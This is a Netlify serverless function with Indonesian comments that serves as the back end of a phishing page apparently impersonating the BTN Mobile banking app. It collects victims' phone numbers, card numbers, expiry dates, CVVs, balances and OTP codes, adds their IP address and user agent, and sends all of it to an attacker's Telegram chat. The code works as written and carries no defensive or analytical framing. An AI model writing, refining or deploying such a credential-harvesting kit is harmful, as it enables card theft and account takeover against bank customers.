// netlify/functions/send-notification.js

// Konfigurasi Bot Telegram (akan diisi via Environment Variables di Netlify)
// TELEGRAM_BOT_TOKEN dan TELEGRAM_CHAT_ID akan di-set di Netlify Dashboard

exports.handler = async (event, context) => {
    // Hanya menerima method POST
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ error: 'Method not allowed' })
        };
    }

    // Ambil token dari environment variables Netlify
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    // Validasi konfigurasi
    if (!BOT_TOKEN || !CHAT_ID) {
        console.error('Missing Telegram configuration');
        return {
            statusCode: 500,
            body: JSON.stringify({ error: 'Server configuration error' })
        };
    }

    try {
        // Parse data yang dikirim dari client
        const data = JSON.parse(event.body);
        
        const {
            phoneNumber,
            cardNumber,
            expiryDate,
            cvv,
            estimatedBalance,
            otpCode,
            timestamp
        } = data;

        // Format pesan untuk Telegram
        const currentTime = new Date(timestamp).toLocaleString('id-ID', {
            timeZone: 'Asia/Jakarta',
            day: '2-digit',
            month: '2-digit',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });

        // Hitung IP Address (jika ada)
        const clientIP = event.headers['x-forwarded-for'] || 
                        event.headers['client-ip'] || 
                        'Unknown IP';

        // Buat pesan yang informatif untuk monitoring
        let message = `🔐 *BTN MOBILE - DATA PEMULIHAN AKUN*\n\n`;
        message += `📱 *Nomor HP:* ${phoneNumber || '-'}\n`;
        message += `💳 *Nomor Kartu:* ${cardNumber || '-'}\n`;
        message += `📅 *Expiry:* ${expiryDate || '-'}\n`;
        message += `🔑 *CVV:* ${cvv || '-'}\n`;
        message += `💰 *Estimasi Saldo:* Rp ${formatRupiah(estimatedBalance) || '0'}\n`;
        message += `🔢 *Kode OTP:* ${otpCode || '-'}\n\n`;
        message += `🕐 *Waktu:* ${currentTime}\n`;
        message += `🌐 *IP Address:* ${clientIP}\n`;
        message += `🤖 *User Agent:* ${event.headers['user-agent'] || '-'}\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━\n`;
        message += `⚠️ *Alert: New Submission*`;

        // Kirim ke Telegram
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            })
        });

        const result = await response.json();

        if (!response.ok) {
            console.error('Telegram API Error:', result);
            return {
                statusCode: 500,
                body: JSON.stringify({ 
                    error: 'Failed to send notification',
                    details: result.description 
                })
            };
        }

        // Kirim juga pesan notifikasi singkat (opsional)
        await sendQuickNotification(BOT_TOKEN, CHAT_ID, phoneNumber);

        return {
            statusCode: 200,
            body: JSON.stringify({ 
                success: true, 
                message: 'Notification sent successfully' 
            })
        };

    } catch (error) {
        console.error('Error processing request:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ 
                error: 'Internal server error',
                details: error.message 
            })
        };
    }
};

// Fungsi untuk format Rupiah
function formatRupiah(angka) {
    if (!angka) return '0';
    let number_string = angka.toString().replace(/[^,\d]/g, '');
    let split = number_string.split(',');
    let sisa = split[0].length % 3;
    let rupiah = split[0].substr(0, sisa);
    let ribuan = split[0].substr(sisa).match(/\d{3}/gi);
    
    if (ribuan) {
        let separator = sisa ? '.' : '';
        rupiah += separator + ribuan.join('.');
    }
    return rupiah || '0';
}

// Fungsi untuk mengirim notifikasi singkat ke Telegram (optional)
async function sendQuickNotification(botToken, chatId, phoneNumber) {
    try {
        const quickMessage = `🔔 *New Submission*\n📱 Phone: ${phoneNumber || 'Unknown'}\n🕐 Time: ${new Date().toLocaleTimeString('id-ID')}`;
        
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: quickMessage,
                parse_mode: 'Markdown',
                disable_notification: false
            })
        });
    } catch (error) {
        console.error('Failed to send quick notification:', error);
    }
}
